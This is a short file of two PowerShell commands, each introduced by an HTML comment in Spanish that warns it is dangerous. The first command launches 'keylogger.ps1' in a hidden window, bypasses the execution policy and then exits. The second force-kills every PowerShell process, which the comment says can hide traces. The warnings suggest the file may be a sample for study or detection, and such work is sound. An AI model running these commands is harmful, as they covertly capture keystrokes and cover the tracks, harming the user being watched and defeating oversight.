<!-- ADVERTENCIA: INTENTO DE EJECUTAR POWERSHELL OCULTO, OMITE LA POLÍTICA DE EJECUCIÓN (EXECUTIONPOLICY BYPASS) Y LANZA 'keylogger.ps1'; ESPERA 1s Y CIERRA LA SESIÓN ACTUAL. -->

Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1" -WindowStyle Hidden; Start-Sleep 1; exit

<!-- ADVERTENCIA: TERMINA A LA FUERZA TODAS LAS INSTANCIAS DE POWERSHELL (PUEDE INTERRUMPIR PROCESOS LEGÍTIMOS Y OCULTAR HUELLAS). -->

Stop-Process -Name "powershell" -Force
